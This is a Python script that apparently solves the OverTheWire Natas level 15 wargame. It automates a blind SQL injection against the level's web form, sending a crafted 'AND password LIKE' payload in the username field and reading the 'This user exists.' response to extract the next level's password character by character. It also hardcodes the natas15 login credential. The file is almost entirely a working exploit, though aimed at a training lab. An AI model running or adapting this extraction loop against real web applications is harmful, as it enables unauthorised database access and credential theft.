import requests
import string
from html.parser import HTMLParser

class MyHTMLParser(HTMLParser):
    printContent = False
    returnedResponse = ""
    def handle_starttag(self, tag, attrs):
        if(tag != "div"): return
        for key, value in attrs:
            if (key == "id" and value == "content"):
                self.printContent = True

    def handle_data(self, data):
        if(self.printContent): 
            self.returnedResponse = data
            self.printContent = False

username = "natas15"
pwd = "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g"
success_text = "This user exists."

# Combine digits, lowercase letters, and uppercase letters
char_list = list(string.digits + string.ascii_letters)

guessed_pwd = ""

print("[!] Brute force started ")
for _ in range(len(pwd)): # assuming the password for each user is the same length
    response = ""
    next_char_idx = 0 # always start from the first char
    
    while response != success_text and next_char_idx < len(char_list): # proceed guessing the next character
        # Crafting next SQL query
        query = f'natas16" AND password LIKE "{guessed_pwd}{char_list[next_char_idx]}%" -- '
        r = requests.post(f"http://{username}.natas.labs.overthewire.org", auth=(username, pwd), data={"username": query})
        if (r.status_code == 200):
            html_text = r.content.decode('utf-8')
            parser = MyHTMLParser()
            parser.feed(html_text)
            response = parser.returnedResponse.strip()
        else:
            print(f"[!] Something went wrong! Request Status: {r.status_code}") 

        # Increment the index so the loop moves to the next character
        if response != success_text:
            next_char_idx += 1
    
    if response == success_text:
        guessed_pwd += char_list[next_char_idx]
        print(f"[+] Progress: {guessed_pwd}")
    else:
        print("\n[-] No matching character found, stopping.")
        break
print("\n[!] End of loop")
print(f"Guessed password: {guessed_pwd}")



